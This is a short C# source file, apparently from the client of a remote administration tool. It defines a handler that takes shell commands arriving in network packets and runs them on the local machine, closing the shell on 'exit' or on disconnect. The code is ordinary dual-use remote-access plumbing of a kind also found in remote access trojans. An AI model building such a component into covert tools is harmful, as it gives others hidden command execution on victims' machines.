using Client.IO;
using Client.Networking.Packets.RemoteShell;

namespace Client.Networking.Handlers
{
    public class RemoteShellHandler : IDisposable
    {
        private readonly Client _client;
        private Shell _shell;

        public RemoteShellHandler(Client client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Client s, bool connected)
        {
            if (!connected)
            {
                _shell?.Dispose();
            }
        }

        public async Task SendCommand(RemoteShellPacket packet)
        {
            if (_shell == null && packet.Command == "exit") return;
            if (_shell == null) _shell = new Shell(_client);

            if (packet.Command == "exit")
                _shell.Dispose();
            else
                _shell.ExecuteCommand(packet.Command);
        }
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
